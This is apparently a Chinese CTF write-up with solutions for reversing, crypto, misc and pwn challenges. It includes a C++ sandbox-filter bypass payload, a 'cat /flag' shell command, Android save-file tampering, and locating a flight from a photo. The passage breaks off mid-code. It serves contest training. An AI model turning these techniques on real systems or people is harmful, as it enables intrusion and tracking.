<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_12EC</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*(_BYTE *)(v3 + a3) )</span><br><span class="line">    byte_4080[*(<span class="type">unsigned</span> __int8 *)(v4 - <span class="number">1</span>)] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> __int8 *)(v4 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><font color=red><strong>sub_12EC</strong></font>检查<code>v3 + a3</code>指向的字节是否为0，若是，将<font color=red><strong>byte_4080</strong></font>数组中<code>v4 - 1</code>指向的字节值作为索引的位置设置1，并返回<code>v4 - 1</code>指向的字节值，<font color=red><strong>sub_12EC</strong></font>应为该支链上最末端的函数.<br><br>至此所有自定义函数均已分析完毕，经动态调试发现输入值是以四个字符为单位进行加密的，但却不是逐组加密，而是按第<font color=lime><strong>1 2 9 4 3 7 5 6 8 10</strong></font>组的顺序加密，a2是固定数组<font color=lime><strong>[0x75, 0x61, 0x72, 0x65, 0x66, 0x69, 0x72, 0x73, 0x74, 0x2E]</strong></font>，每组中的加密为：</p>
<p>① <font color=red><strong>sub_1313</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*a1 ^= a2;<span class="comment">//第一个字符变为异或a2后的字符</span></span><br><span class="line">a1[<span class="number">1</span>] ^= *a1;<span class="comment">//第二个字符变为异或第一个字符后的字符</span></span><br></pre></td></tr></table></figure>
<p>② <font color=red><strong>sub_137B</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">1LL</span>) = *v0 + *(_BYTE *)(v2 - <span class="number">28</span>);<span class="comment">//新第二个字符 = 第二个字符+a2强制转换成byte</span></span><br><span class="line">*(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">2LL</span>) ^= *(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">1LL</span>);<span class="comment">//第三个字符变为异或第二个字符后的字符</span></span><br><span class="line">*(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">2LL</span>) -= *(_BYTE *)(v2 - <span class="number">28</span>);<span class="comment">//新第三个字符 = 第三个字符-a2 强制转换成byte</span></span><br><span class="line">*(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">3LL</span>) ^= *(_BYTE *)(*(_QWORD *)(v2 - <span class="number">24</span>) + <span class="number">2LL</span>);<span class="comment">//第四个字符变为异或第三个字符后的字符</span></span><br></pre></td></tr></table></figure>
<p>③ <font color=red><strong>sub_1410</strong></font>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> sub_62C568C23434(a1, a2, *(_BYTE *)(v3 + <span class="number">3</span>) ^ a3);<span class="comment">//注意到这里的最后一个参数，v3+3是第四个字符，a3是第一个字符，以输入flag为例，①②完成后第一个字符变为13，第四个字符变为47，但最后第一个字符会变成54，而47^13正是54，所以这一步是让第一个字符成为第四个字符和第一个字符的异或值.</span></span><br></pre></td></tr></table></figure>
<p>结合密文<font color=lime><strong>[54h, F4h, 20h, 47h, FCh, C4h, 93h, E6h, 39h, E0h, 6Eh, 00h, A5h, 6Eh, AAh, 9Fh, 7Ah, A1h, 66h, 39h, 76h, B7h, 67h, 57h, 3Dh, 95h, 61h, 22h, 55h, C9h, 3Bh, 4Eh, 4Fh, E8h, 66h, 08h, 3Dh, 50h, 43h, 3Eh]</strong></font>编写python代码进行解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = 	[[<span class="number">0x54</span>, <span class="number">0xF4</span>, <span class="number">0x20</span>, <span class="number">0x47</span>], [<span class="number">0xFC</span>, <span class="number">0xC4</span>, <span class="number">0x93</span>, <span class="number">0xE6</span>],</span><br><span class="line">             [<span class="number">0x39</span>, <span class="number">0xE0</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>], [<span class="number">0xA5</span>, <span class="number">0x6E</span>, <span class="number">0xAA</span>, <span class="number">0x9F</span>],</span><br><span class="line">             [<span class="number">0x7A</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x39</span>], [<span class="number">0x76</span>, <span class="number">0xB7</span>, <span class="number">0x67</span>, <span class="number">0x57</span>],</span><br><span class="line">             [<span class="number">0x3D</span>, <span class="number">0x95</span>, <span class="number">0x61</span>, <span class="number">0x22</span>], [<span class="number">0x55</span>, <span class="number">0xC9</span>, <span class="number">0x3B</span>, <span class="number">0x4E</span>],</span><br><span class="line">             [<span class="number">0x4F</span>, <span class="number">0xE8</span>, <span class="number">0x66</span>, <span class="number">0x08</span>], [<span class="number">0x3D</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x3E</span>]]</span><br><span class="line">a2 = [<span class="number">0x75</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x72</span>, <span class="number">0x2E</span>]<span class="comment">#按顺序排的a2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">enc_flag[i][<span class="number">0</span>] = enc_flag[i][<span class="number">3</span>] ^ enc_flag[i][<span class="number">0</span>]</span><br><span class="line">enc_flag[i][<span class="number">3</span>] ^= enc_flag[i][<span class="number">2</span>]</span><br><span class="line">enc_flag[i][<span class="number">2</span>] = ((enc_flag[i][<span class="number">2</span>] + a2[i]) &amp; <span class="number">0xFF</span>) ^ enc_flag[i][<span class="number">1</span>]</span><br><span class="line">enc_flag[i][<span class="number">1</span>] = ((enc_flag[i][<span class="number">1</span>] - a2[i]) &amp; <span class="number">0xFF</span>) ^ enc_flag[i][<span class="number">0</span>]</span><br><span class="line">enc_flag[i][<span class="number">0</span>] ^= a2[i]</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br></pre></td></tr></table></figure>
<p>输出<font color=LimeGreen><strong>[[102, 108, 97, 103], [123, 121, 48, 117], [95, 67, 52, 110], [95, 51, 97, 53], [49, 108, 121, 95], [82, 101, 109, 48], [118, 51, 95, 67], [111, 78, 102, 117], [53, 49, 48, 110], [45, 33, 33, 125]]</strong></font>，转化得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>],</span><br><span class="line"> [<span class="number">0x7b</span>, <span class="number">0x79</span>, <span class="number">0x30</span>, <span class="number">0x75</span>],</span><br><span class="line"> [<span class="number">0x5f</span>, <span class="number">0x43</span>, <span class="number">0x34</span>, <span class="number">0x6e</span>],</span><br><span class="line"> [<span class="number">0x5f</span>, <span class="number">0x33</span>, <span class="number">0x61</span>, <span class="number">0x35</span>],</span><br><span class="line"> [<span class="number">0x31</span>, <span class="number">0x6c</span>, <span class="number">0x79</span>, <span class="number">0x5f</span>],</span><br><span class="line"> [<span class="number">0x52</span>, <span class="number">0x65</span>, <span class="number">0x6d</span>, <span class="number">0x30</span>],</span><br><span class="line"> [<span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x5f</span>, <span class="number">0x43</span>],</span><br><span class="line"> [<span class="number">0x6f</span>, <span class="number">0x4e</span>, <span class="number">0x66</span>, <span class="number">0x75</span>],</span><br><span class="line"> [<span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x6e</span>],</span><br><span class="line"> [<span class="number">0x2d</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x7d</span>]]</span><br></pre></td></tr></table></figure>
<p>十六进制转字符得到<font color=deepskyblue><strong>flag{y0u_C4n_3a51ly_Rem0v3_CoNfu510n-!!}</strong></font>.</p>
<h2 id="Crypto方向：-2"><a href="#Crypto方向：-2" class="headerlink" title="Crypto方向："></a>Crypto方向：</h2><h3 id="故事新编1："><a href="#故事新编1：" class="headerlink" title="故事新编1："></a>故事新编1：</h3><p>观察被加密后的文本和加密方式得知是维尼吉亚密码，代入<a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">求解器</a>，计算得key为<code>subtitution</code>，解得<code>zen1</code>为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BEAUTIFUL IS BETTER THAN UGLY.</span><br><span class="line">EXPLICIT IS BETTER THAN IMPLICIT.</span><br><span class="line">SIMPLE IS BETTER THAN COMPLEX.</span><br><span class="line">COMPLEX IS BETTER THAN COMPLICATED.</span><br><span class="line">FLAT IS BETTER THAN NESTED.</span><br><span class="line">SPARSE IS BETTER THAN DENSE.</span><br><span class="line">FLAGA IS VEGENERE</span><br><span class="line">READABILITY COUNTS.</span><br><span class="line">SPECIAL CASES AREN&#x27;T SPECIAL ENOUGH TO BREAK THE RULES.</span><br><span class="line">ALTHOUGH PRACTICALITY BEATS PURITY.</span><br><span class="line">ERRORS SHOULD NEVER PASS SILENTLY.</span><br><span class="line">UNLESS EXPLICITLY SILENCED.</span><br></pre></td></tr></table></figure>
<p>将明文的结尾多加上一个换行符带回原python文件执行，发现输出与所给相同，返回<font color=deepskyblue><strong>flag{bda2bcf1eaeff7754a6483e74e70a937}</strong></font>.</p>
<h3 id="没e这能玩？："><a href="#没e这能玩？：" class="headerlink" title="没e这能玩？："></a>没e这能玩？：</h3><p>观察发现是类RSA加密，给了三个大质数pqr的相关方程组，由于每组的值均已知，那么pqr构成的三元一次方程组是可以直接解的：<br><img src="/pictures/ns24_noe.png"><br><br>解得：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p=10183677214652023044474780341271224480860741865271128462400237861954731862671046572481587003643951915319746511716779405224320633957652210335830783097185731</span><br><span class="line">q=10501863154525380899885393651734595340401622693414265402191855789807170977044584937255025740961595981958235238915269093897387769735490697411913603370485999</span><br><span class="line">r=10457194869353593100177834984530743371730082196597132299112004173986134317902326819633405971492147254575586164057393393898548415838816927385666152840961767</span><br></pre></td></tr></table></figure>
<p>接下来又给出了大质数的e次方除以2的512次方的余数hint，即<code>prime ^ e ≡ hint (mod 2^512)</code>，发现e用python极其难以计算，在linux上下载专业求解器<code>PARI/GP</code>，编写.gp脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">h=<span class="number">1117823254118009923270987314972815939020676918543320218102525712576467969401820234222225849595448982263008967497960941694470967789623418862506421153355571</span>;</span><br><span class="line">p=<span class="number">10340528340717085562564282159472606844701680435801531596688324657589080212070472855731542530063656135954245247693866580524183340161718349111409099098622379</span>;</span><br><span class="line">mod = <span class="number">2</span>^<span class="number">512</span>;</span><br><span class="line">e = znlog(Mod(h, mod), Mod(p, mod));</span><br><span class="line"><span class="keyword">if</span> (e == <span class="number">0</span>,<span class="built_in">print</span>(<span class="string">&quot;Failed to find e&quot;</span>),<span class="built_in">print</span>(<span class="string">&quot;Found e:&quot;</span>, e));</span><br></pre></td></tr></table></figure>
<p>输出<code>e = 18344052974846453963</code>，带回原文件，使用之前的解密文件，结合<code>phin = (p-1)\*(q-1)\*(r-1)</code>，<code>d = gmpy2.invert(e,phin)</code>，得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d=353990565818625470203369777239314743702215915925233196685710922971035136745962920650978745767080817978533931486524755066350185911891300410592045053635868129756936833542534389569636562575622589318159685096070360444918245742399076155280089425194564103920810567326139574530309013616431270046381080112401477101628065595664594982640241027864708389381440505030265366815955626373592957956775853576195599726111052060073122365749364757456811923493380577927720503392159587</span><br></pre></td></tr></table></figure>
<p>结合原文件的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=999238457633695875390868312148578206874085180328729864031502769160746939370358067645058746087858200698064715590068454781908941878234704745231616472500544299489072907525181954130042610756999951629214871917553371147513692253221476798612645630242018686268404850587754814930425513225710788525640827779311258012457828152843350882248473911459816471101547263923065978812349463656784597759143314955463199850172786928389414560476327593199154879575312027425152329247656310</span><br></pre></td></tr></table></figure>
<p>得到<code>m = powmod(c, d, n)</code> &#x3D; <font color=lime><strong>2761328357324640838041048482823820617928011152855994221385645606528893</strong></font>，结合python脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m2 = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m2 =&#x27;</span>, m2)</span><br><span class="line">m3 = m2.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m3 =&#x27;</span>, m3)</span><br></pre></td></tr></table></figure>
<p>得到<font color=deepskyblue><strong>flag{th1s_2s_A_rea119_f34ggg}</strong></font>.</p>
<h3 id="故事新编2："><a href="#故事新编2：" class="headerlink" title="故事新编2："></a>故事新编2：</h3><p>发现同样是维尼吉亚密码，代入求解器选择<code>autokey</code>模式解得key为<code>supersubtitution</code>，<code>zen2</code>为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IN THE FACE OF AMBIGUITY, REFUSE THE TEMPTATION TO GUESS.</span><br><span class="line">THERE SHOULD BE ONE-- AND PREFERABLY ONLY ONE --OBVIOUS WAY TO DO IT.</span><br><span class="line">ALTHOUGH THAT WAY MAY NOT BE OBVIOUS AT FIRST UNLESS YOU&#x27;RE DUTCH.</span><br><span class="line">NOW IS BETTER THAN NEVER.</span><br><span class="line">ALTHOUGH NEVER IS OFTEN BETTER THAN RIGHT NOW.</span><br><span class="line">IF THE IMPLEMENTATION IS HARD TO EXPLAIN, IT&#x27;S A BAD IDEA.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>是python之禅的另一部分，但这次中间没有夹杂额外的句子，将明文的结尾多加上一个换行符，返回<font color=deepskyblue><strong>flag{8bc383165248f2e45a6910960a61e6a8}</strong></font>.</p>
<h2 id="Misc方向：-2"><a href="#Misc方向：-2" class="headerlink" title="Misc方向："></a>Misc方向：</h2><h3 id="BGM坏了吗？："><a href="#BGM坏了吗？：" class="headerlink" title="BGM坏了吗？："></a>BGM坏了吗？：</h3><p>观察音乐频谱发现最后几秒钟的左声道为杂音，右声道有整齐的波形，截取右声道的波形如下：<br><img src="/pictures/ns24_DTMF.png"><br>经过对比分析得知这是经典的DTMF拨号音，经过比对听出信息为<font color=lime><strong>2024093020241103</strong></font>，即为flag.</p>
<h3 id="ez-jail："><a href="#ez-jail：" class="headerlink" title="ez_jail："></a>ez_jail：</h3><p>下载后观察文件发现题目配置了一个用Python编写的服务器，需要上传被base64编码的C++代码，并在不允许使用#include、#define、不包含{}、长度不超过100字符的情况下执行，若成功输出”Hello, World!”，则会返回flag，查找各种信息后发现二元字符&lt;%和%&gt;可以替代{}，将void user_code() &lt;% std::cout &lt;&lt; “Hello, World!”; %&gt;转换成base64：<font color=lime><strong>dm9pZCB1c2VyX2NvZGUoKSA8JSBzdGQ6OmNvdXQgPDwgIkhlbGxvLCBXb3JsZCEiOyAlPg&#x3D;&#x3D;</strong></font>并输入，得到<font color=deepskyblue><strong>flag{cabac835-dabb-406e-8047-c83a95868834}</strong></font>.</p>
<h3 id="AmazingGame："><a href="#AmazingGame：" class="headerlink" title="AmazingGame："></a>AmazingGame：</h3><p>把游戏至少打通一关，安装MT管理器，找到安装包提取，找到<code>com.pangbai.projectm</code>，发现数据目录<code>/data/user/0/com.pangbai.projectm</code>，找到<code>shared_prefs</code>，发现一个文件<code>net.osaris.turbofly.JumpyBall.xml</code>，点击查看发现是存档，代码如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;unlockedsolotracks&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;unlockedtracks&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;best0m0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;135&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;unlockedships&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;userid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;7034550&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将前两个值修改为<code>21</code>，第四个值改成<code>5</code>（解锁最强战机）再次启动游戏发现文档已经被改回去，但是多了个bak文件，点击bak文件恢复备份（将bak文件与现在的文档互换后缀），再次修改成同样的值，并等待一会，发现关卡已解锁，把第二十关打通，得到<font color=deepskyblue><strong>flag{U_W1n!!_7he_g@m4}</strong></font>.</p>
<h3 id="OSINT-MASTER："><a href="#OSINT-MASTER：" class="headerlink" title="OSINT-MASTER："></a>OSINT-MASTER：</h3><p>打开图像发现是在飞机上拍的照片，右侧机翼上有飞机编号<code>B-2419</code>，点击图像详细信息，发现拍摄时间<code>2024年8月18日14:30</code>，在飞常准软件中搜索，得到航班编号<code>MU5156</code>，跟踪得到14:30时位于山东省济宁市，组合得到<font color=deepskyblue><strong>flag{MU5156_济宁市}</strong></font>.</p>
<h1 id="赛题轮次：Week4"><a href="#赛题轮次：Week4" class="headerlink" title="赛题轮次：Week4"></a>赛题轮次：Week4</h1><h2 id="已解出的题目：-3"><a href="#已解出的题目：-3" class="headerlink" title="已解出的题目："></a>已解出的题目：</h2><table>
<thead>
<tr>
<th align="center">题目类型</th>
<th align="center">题目名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Pwn</td>
<td align="center">Maze_Rust</td>
</tr>
<tr>
<td align="center">Reverse</td>
<td align="center">Easygui、ezrust、MazE、洞OVO</td>
</tr>
<tr>
<td align="center">Crypto</td>
<td align="center">欧拉欧拉！！、圣石匕首</td>
</tr>
<tr>
<td align="center">Misc</td>
<td align="center">扫码领取flag、ezblockchain、Alt</td>
</tr>
</tbody></table>
<h2 id="Pwn方向：-1"><a href="#Pwn方向：-1" class="headerlink" title="Pwn方向："></a>Pwn方向：</h2><h3 id="Maze-Rust："><a href="#Maze-Rust：" class="headerlink" title="Maze_Rust："></a>Maze_Rust：</h3><p>把迷宫走完就出来了，卡墙了就刷新地图，最后：<br><br>Say something: cat &#x2F;flag<br><br>返回<font color=deepskyblue><strong>flag{bf1bc81d-3f19-46a5-9962-15367aa71e06}</strong></font>.</p>
<h2 id="Reverse方向：-3"><a href="#Reverse方向：-3" class="headerlink" title="Reverse方向："></a>Reverse方向：</h2><h3 id="easygui："><a href="#easygui：" class="headerlink" title="easygui："></a>easygui：</h3><p>反编译找到WinMain，发现整个主函数里面只有一个子函数sub_140001490，查看发现前面声明了一大串变量，再往下就是程序的输入框和验证框，在第140行找到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( WindowTextW &lt;= <span class="number">44</span> )</span><br><span class="line">&#123;</span><br><span class="line">  sub_140001000(String, (<span class="type">unsigned</span> <span class="type">int</span>)WindowTextW, v93);</span><br></pre></td></tr></table></figure>
<p>之后是大量的字符比较和最终结果的打印，可以证明这里就是给输入的字符串进行加密和验证的地方，加密的flag值为<font color=lime><strong>[-33, -57, 77, 20, -63, -20, 8, -28, 95, 63, 3, -76, -112, 74, -71, -113, -113, -6, 113, 67, -57, -15, -99, -35, 79, -64, 18, 68, 92, -99, -120, 54, 45, 22, 29, -19, -68, -17, -69, 91, -97, 119,-21, 88]</strong></font>，再观察加密函数<font color=red><strong>sub_140001000(String, (unsigned int)WindowTextW, v93);</strong></font>：<code>string</code>是输入的字符串（但是每个字符之间有一个间隔），<code>windowtextw</code>是输入字符串长度，<code>v93</code>是输入的字符串的每个字符，函数将输入的字符串移动到<code>Src</code>数组，然后将<code>v29</code>数组加载上8个常量：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">xmmword_140003390:</span> <span class="number">17122A41293C7A6463251526050E3B7Fh</span></span><br><span class="line"><span class="symbol">xmmword_1400033A0:</span> <span class="number">231975071D4E4A6740241E4D324C5C58h</span></span><br><span class="line"><span class="symbol">xmmword_1400033B0:</span> <span class="number">286A5D7E6D69183F620F681B30014F0Ch</span></span><br><span class="line"><span class="symbol">xmmword_1400033C0:</span> <span class="number">431F6B044265353A7078530320547431h</span></span><br><span class="line"><span class="symbol">xmmword_1400033D0:</span> <span class="number">51562C591A2F4B52130B082176003706h</span></span><br><span class="line"><span class="symbol">xmmword_1400033E0:</span> <span class="number">5A141C5F7116476F6C4433663D57392Eh</span></span><br><span class="line"><span class="symbol">xmmword_1400033F0:</span> <span class="number">73770A0D7D1127342B7C492D6E613660h</span></span><br><span class="line"><span class="symbol">xmmword_140003400:</span> <span class="number">7948103845467B503E025E0972555B22h</span></span><br></pre></td></tr></table></figure>
<p>注意到<code>xmmword</code>都是从右往左填入的（仍然是小端序），也即</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v29 = [</span><br><span class="line"><span class="number">0x31</span>, <span class="number">0x74</span>, <span class="number">0x54</span>, <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x53</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x3a</span>, <span class="number">0x35</span>, <span class="number">0x65</span>, <span class="number">0x42</span>, <span class="number">0x04</span>, <span class="number">0x6b</span>, <span class="number">0x1f</span>, <span class="number">0x43</span>,</span><br><span class="line"><span class="number">0x06</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x21</span>, <span class="number">0x08</span>, <span class="number">0x0b</span>, <span class="number">0x13</span>, <span class="number">0x52</span>, <span class="number">0x4b</span>, <span class="number">0x2f</span>, <span class="number">0x1a</span>, <span class="number">0x59</span>, <span class="number">0x2c</span>, <span class="number">0x56</span>, <span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x7f</span>, <span class="number">0x3b</span>, <span class="number">0x0e</span>, <span class="number">0x05</span>, <span class="number">0x26</span>, <span class="number">0x15</span>, <span class="number">0x25</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x7a</span>, <span class="number">0x3c</span>, <span class="number">0x29</span>, <span class="number">0x41</span>, <span class="number">0x2a</span>, <span class="number">0x12</span>, <span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x2e</span>, <span class="number">0x39</span>, <span class="number">0x57</span>, <span class="number">0x3d</span>, <span class="number">0x66</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x6c</span>, <span class="number">0x6f</span>, <span class="number">0x47</span>, <span class="number">0x16</span>, <span class="number">0x71</span>, <span class="number">0x5f</span>, <span class="number">0x1c</span>, <span class="number">0x14</span>, <span class="number">0x5a</span>,</span><br><span class="line"><span class="number">0x0c</span>, <span class="number">0x4f</span>, <span class="number">0x01</span>, <span class="number">0x30</span>, <span class="number">0x1b</span>, <span class="number">0x68</span>, <span class="number">0x0f</span>, <span class="number">0x62</span>, <span class="number">0x3f</span>, <span class="number">0x18</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x7e</span>, <span class="number">0x5d</span>, <span class="number">0x6a</span>, <span class="number">0x28</span>,</span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x5b</span>, <span class="number">0x55</span>, <span class="number">0x72</span>, <span class="number">0x09</span>, <span class="number">0x5e</span>, <span class="number">0x02</span>, <span class="number">0x3e</span>, <span class="number">0x50</span>, <span class="number">0x7b</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x38</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x36</span>, <span class="number">0x61</span>, <span class="number">0x6e</span>, <span class="number">0x2d</span>, <span class="number">0x49</span>, <span class="number">0x7c</span>, <span class="number">0x2b</span>, <span class="number">0x34</span>, <span class="number">0x27</span>, <span class="number">0x11</span>, <span class="number">0x7d</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x77</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x58</span>, <span class="number">0x5c</span>, <span class="number">0x4c</span>, <span class="number">0x32</span>, <span class="number">0x4d</span>, <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x40</span>, <span class="number">0x67</span>, <span class="number">0x4a</span>, <span class="number">0x4e</span>, <span class="number">0x1d</span>, <span class="number">0x07</span>, <span class="number">0x75</span>, <span class="number">0x19</span>, <span class="number">0x23</span>]</span><br></pre></td></tr></table></figure>

<p>之后进行第一次加密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">int</span>)v4 &gt; <span class="number">0</span> )	<span class="comment">//输入值长度</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>i64; j &lt; v4; ++j )</span><br><span class="line">    Src[j] = *((_BYTE *)v29 + (<span class="type">unsigned</span> __int8)Src[j]);	<span class="comment">//实测这里加上的数与原本的字符类型绑定</span></span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>i64; k &lt; v4; k += <span class="number">4</span>i64 )	<span class="comment">//4个字符一组</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = Src[k + <span class="number">3</span>];	<span class="comment">//每组字符串的第4个字符</span></span><br><span class="line">    v12 = Src[k + <span class="number">2</span>];	<span 